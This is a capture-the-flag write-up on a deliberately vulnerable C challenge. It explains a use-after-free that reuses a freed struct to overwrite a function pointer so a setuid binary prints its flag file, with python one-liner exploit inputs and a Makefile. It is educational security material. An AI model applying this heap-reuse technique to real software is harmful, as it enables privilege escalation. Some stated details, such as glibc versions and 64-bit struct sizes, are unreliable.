## Challenge 4

#### Description
There is a problem (or more than 1) in the following code, which can lead to unwanted behavior.
The goal of this challenge is to find the problem (if there is more than 1, then find all the problems) and describe it fully, including a description of how to exploit it.


[*] Bonus points for compiling it (fully protected - PIE, ASLR, W^X) and writing a fully working exploit (locally).

# Solution
------------------------
` puts("UAF!!!"); `
The author gave us a hint that we are dealing with UAF (Use-After-Free) vulnurabitly

Lets take a look at diff results with an almost identical challange #5:

## IMAGE1

It gives us a hint that UAF is somehow related to not re-setting the local vars pointers to NULL after we free them.  

How does it help us?  
We can see that cases 2,3,4,6,7 check for NULL value (of Dog and or DogHouse pointers) before allowing performing actions on them   

Since we don't reset to NULL when destroying (deallocating this chunk of memory) the structs, we are able to pass through this check even after destruction.

### Our goal:  
To somehow invoke **bringBackTheFlag()** using the given API.   
Its addr gets stored at dog->bringBackTheFlag when allocating a new Dog

**NOTE** : sizeof(struct Dog) = sizeof(struct DogHouse) =24Bytes [**only for 32bit systems!! (e.g X86**]  
Why : (Taking into consideration struct packing (Alignment of word size = 4 bytes)

```c
struct Dog {
    char name[12]; // 3*4Bytes = 12B
    void (*bark)();             //4B
    void (*bringBackTheFlag)(); //4B
    void (*death)(struct Dog*); //4B
};

struct DogHouse{
    char address[16]; //  4*4Bytes = 16B
    char name[8];     //  2*4Bytes = 8B
};
```

Or visually:
```
Dog:
----------------------------------------------------------------------------------------
|                name[12]                 | bark[4] | braingBackTheFlag[4] | death[4]  |
----------------------------------------------------------------------------------------
DogHouse:
|                address[16]                        |           name [8]               |
----------------------------------------------------------------------------------------
The DogHouse we will create:
|               BBBBCCCCDDDD              |BBTF addr| Here we will write at most 8chars|

```

Q: Why do we care about they are the same size?
A: because in the x86 case, **glibc malloc algorithm** will actually reuse (give us) the chunk which was used for the freed(murdered) Dog when requesting heap memory for DogHouse afterwards(at step 3. see the described following steps down below). 


For 64bit arch we will get sizeof(struct Dog) = 36B instead which looks like this:
```
Dog:  ()
----------------------------------------------------------------------------------------
|           name[12]     |     bark[8]     | braingBackTheFlag[8] |       death[8]     |
----------------------------------------------------------------------------------------
DogHouse:  
|            address[16]          |    name [8]      |
------------------------------------------------------
```
**We will talk about the X64 case later and see it won't let us reuse it like we did in step 3**


**back to X86:**
------------   
Remember that we don't have in the code an implicit call to bringBackTheFlag(), so our only way is to overwrite the either one of the two func pointer fields **bark / death**.  
We will choose to override **bark** (no particualar reason). 

Each time we allocate a new Dog (even after freeing it/them) it won't help us to do so  

**But** - We can allocate a new DogHouse at the addr where an old (freed) Dog was (where the local var dog still points to) and set it's field (char buffers) to whatever input we wish

So, The sequence of commands we need is the following:
1. new dog
2. kill dog
3. new DogHouse [specially crafted **payload**]
4. bark 

**Compilation & Linking**
---------------------------------------------------------------- 
if libc.so isn't set to be searched & loaded from a specific path prior to running the program, then the os will use whatever libc version it has 
(you can check it with ` $(ldd /bin/ls|grep libc.so|cut -d' ' -f3) ` for example. Because most likely all the os binaries (/bin) will use the same libc so)

We will prove our exploit can work on the version that comes with Ubuntu 18.04:  **v2.31** since it won't step on any glibc security mitigations till this version.

Since ASLR doesn't matter for us (**bringBackTheFlag** is not a library/external/linked function within the PLT ), lets begin with PIE mitigation off

We will us the following MAKEFILE template for this challnage (We'll Turn on PIE later and see its effect), remember we are compiling for 32 bit:
```c
CHALLENGE=q4

CC=gcc
CFLAGS=-Wall -Wextra -m32 -fstack-protector-all -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro,-z,noexecstack -no-pie

SRC=$(CHALLENGE).c
OBJ=$(SRC:.c=.o)
BIN=$(CHALLENGE)

.DEFAULT_GOAL := challenge
.PHONY : clean all

pre-build:
	@echo "Removing immutable flags..."
	chattr -R -i .

post-build:
	@echo "Adding immutable flags..."
	chattr -R +i .

all: pre-build
	@echo "Compiling..."
	$(MAKE) $(BIN)

$(BIN): $(OBJ)
	$(CC) -o $@ $(SRC) $(LDFLAGS) $(CFLAGS)

challenge: all
	@echo "Applying permissions..."
	rm -f $(OBJ)
	chmod 440 $(SRC) Makefile
	chmod 400 .passwd
	chmod 4550 $(BIN)
	$(MAKE) post-build

clean: pre-build
	rm -f $(BIN) $(OBJ)
	$(MAKE) post-build

```
which causes the following permissions & setuid : 
```s
-r-------- 1 idanb idanb   28 Apr 10 03:27 .passwd
-r-sr-x--- 1 root  root   12K Apr 10 03:32 q4
-r--r----- 1 idanb idanb 4.0K Apr  6 07:57 q4.c

```


NOTE: Even if we find the addr of  **bringBackTheFlag()** at runtime, we need a way to send the program **raw bytes** which may contain non-printable ascii chars of the **bringBackTheFlag()** addr.
So we need to use either python -c "print ..." and pipe the output to the binary or to attach ourself to the process with pwntools or something similar (pexpect /radare/IDAPython etc) 

we can use pwntool's p32() / int.to_bytes(addr, 4, 'little') to encode the address to a byte-string


if we simply run:  
` python -c "print '1\n' + 'AAAA\n' + '4\n' + '5\n' + 'BBBBCCCCDDDD\xe7\x92\x04\x08\n' + 'EEEEEEEE\n' + '2\n'" | ./q4 `    
the flag inside the local .passwd file (need to create it in the same folder) gets printed 

------------

**Unfortunately** - When compiling with **PIE Enabled** , this method **doesn't work** (after trying to use the new addr **0x5655631e** even though it seems like it doesn't change between runs)  
**TODO:** Read about Think why  
**TODO:** Find a way to overcome it

------------


What about compiling for X64 (structs with different size)?  The concept might still works, but now we'll need to split the adrr bytes between the two inputs (DogHouse adrr&name) , the addr in this case - 0x401298
if we'll try this it won't give us the flag
`
python -c "print '1\n' + 'AAAA\n' + '4\n' + '5\n' + 'BBBBCCCCDDDD\x98\x12\x40\x00\n' + '\x00\x00\x00\x00\n' + '2\n'" | ./q4_x64.out `  

python -c "print '1\n' + 'AAAA\n' + '4\n' + '5\n' + 'BBBBCCCCDDDD\xbb\x87\x04\x08\n' + '\x00\x00\x00\x00\n' + '2\n'" | ./q4_x64.out `
#80487bb
And the reason is probabely because the second malloc picks a different chunk instead of reusing the one we freed  
**TODO:** Prove it by showing heap memory when debugging with gdb/pwndbg(vmmap command)/gef/



Assuming we dealing with **glibc** implementation of libc (which is considered the hardest to exploit) - Since the user data struct sizes are 36B & 24B ,they will get inser(0x30 bin)  (0x20 bin)
Which means it's still possible to use the same method but we'll need to split our input between
address and name.
